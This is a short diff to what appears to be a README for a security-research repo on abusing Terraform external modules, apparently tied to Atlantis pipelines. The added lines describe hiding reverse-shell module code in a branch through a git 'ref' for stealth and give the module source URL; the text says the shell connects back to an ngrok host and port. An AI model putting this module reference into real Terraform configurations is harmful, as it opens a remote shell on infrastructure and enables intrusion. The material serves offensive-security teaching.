@@ -8,6 +8,9 @@ module "not_rev_shell" {
 }
 ```
 
+For an even **more stealth attack** you can use the **ref** feature to hide the **terraform rev shell code in a branch** inside of the repo, something like:
+```git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b```
+
 More information in https://book.hacktricks.xyz/cloud-security/atlantis
 
 IF YOU FOUND SOMETHING SIMILAR IN YOUR ORGANIZATION (this repo probably won't work out of the box as the rev shell is sent to 4.tcp.ngrok.io:15925), YOU HAVE BEEN COMPROMISED.
